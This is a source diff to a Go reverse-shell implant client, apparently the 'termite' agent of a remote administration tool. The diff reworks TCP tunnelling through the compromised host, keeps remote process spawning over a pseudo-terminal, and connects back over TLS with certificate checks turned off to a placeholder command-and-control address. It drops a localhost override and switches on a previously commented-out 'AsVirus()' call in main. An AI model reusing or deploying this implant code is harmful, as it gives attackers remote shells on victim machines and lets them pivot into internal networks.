@@ -105,7 +105,7 @@ func handleConnection(c *Client) {
 			if termiteProcess, exists := processes[msg.Body.(*message.BodyWindowSize).Key]; exists {
 				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
 			}
-		case message.START_PROCESS:
+		case message.PROCESS_START:
 			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
 			if bodyStartProcess.Path == "" {
 				continue
@@ -266,7 +266,7 @@ func handleConnection(c *Client) {
 			backoff.Current = oldBackoffCurrent
 			log.Error("Duplicated connection")
 			os.Exit(0)
-		case message.TERMINATE_PROCESS:
+		case message.PROCESS_TERMINATE:
 			key := msg.Body.(*message.BodyTerminateProcess).Key
 			log.Success("Request terminate %s", key)
 			if termiteProcess, exists := processes[key]; exists {
@@ -274,59 +274,83 @@ func handleConnection(c *Client) {
 				termiteProcess.ptmx.Close()
 			}
 		case message.TUNNEL_CONNECT:
-			log.Info("%s", tunnels)
-			target := msg.Body.(*message.BodyTunnelConnect).Target
-			if _, exists := tunnels[target]; exists {
-				log.Error("Tunnel already connected!")
-				break
-			}
-			log.Info("Connection to: %s", target)
-			conn, err := net.Dial("tcp", target)
+			address := msg.Body.(*message.BodyTunnelConnect).Address
+			token := msg.Body.(*message.BodyTunnelConnect).Token
+
+			conn, err := net.Dial("tcp", address)
 			if err != nil {
 				log.Error(err.Error())
-			} else {
 				c.Encoder.Encode(message.Message{
+					Type: message.TUNNEL_CONNECT_FAILED,
+					Body: message.BodyTunnelConnectFailed{
+						Token:  token,
+						Reason: err.Error(),
+					},
+				})
+			} else {
+				err := c.Encoder.Encode(message.Message{
 					Type: message.TUNNEL_CONNECTED,
 					Body: message.BodyTunnelConnected{
-						Target: target,
+						Token: token,
 					},
 				})
 
-				tunnels[target] = &conn
-				go func(target string, conn net.Conn) {
-					for {
-						data := make([]byte, 0x100)
-						n, err := conn.Read(data)
-						if err == nil {
-							if n > 0 {
+				if err != nil {
+					log.Error(err.Error())
+				} else {
+					tunnels[token] = &conn
+					go func() {
+						for {
+							data := make([]byte, 0x100)
+							n, err := conn.Read(data)
+							if err != nil {
+								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
 								c.Encoder.Encode(message.Message{
-									Type: message.TUNNEL_DATA,
-									Body: message.BodyTunnelData{
-										Target: target,
-										Data:   data[0:n],
+									Type: message.TUNNEL_DISCONNECTED,
+									Body: message.BodyTunnelDisconnected{
+										Token: token,
 									},
 								})
+								conn.Close()
+								break
+							} else {
+								if n > 0 {
+									c.Encoder.Encode(message.Message{
+										Type: message.TUNNEL_DATA,
+										Body: message.BodyTunnelData{
+											Token: token,
+											Data:  data[0:n],
+										},
+									})
+								}
 							}
-						} else {
-							break
 						}
-					}
-				}(target, conn)
+					}()
+				}
 			}
 		case message.TUNNEL_DATA:
-			target := msg.Body.(*message.BodyTunnelData).Target
+			token := msg.Body.(*message.BodyTunnelData).Token
 			data := msg.Body.(*message.BodyTunnelData).Data
-			if conn, exists := tunnels[target]; exists {
-				(*conn).Write(data)
+			if conn, exists := tunnels[token]; exists {
+				_, err := (*conn).Write(data)
+				if err != nil {
+					(*conn).Close()
+				}
 			} else {
 				log.Error("No such tunnel")
 			}
 		case message.TUNNEL_DISCONNECT:
-			target := msg.Body.(*message.BodyTunnelDisconnect).Target
-			if conn, exists := tunnels[target]; exists {
-				log.Info("Closing conntion: %s", conn)
+			token := msg.Body.(*message.BodyTunnelDisconnect).Token
+			if conn, exists := tunnels[token]; exists {
+				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
 				(*conn).Close()
-				delete(tunnels, target)
+				delete(tunnels, token)
+				c.Encoder.Encode(message.Message{
+					Type: message.TUNNEL_DISCONNECTED,
+					Body: message.BodyTunnelDisconnected{
+						Token: token,
+					},
+				})
 			} else {
 				log.Error("No such tunnel")
 			}
@@ -351,7 +375,6 @@ func StartClient() bool {
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-	service = "127.0.0.1:13337"
 	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
 		log.Debug("Connecting to: %s", service)
 		conn, err := tls.Dial("tcp", service, &config)
@@ -408,7 +431,7 @@ func AsVirus() {
 }
 
 func main() {
-	// AsVirus()
+	AsVirus()
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
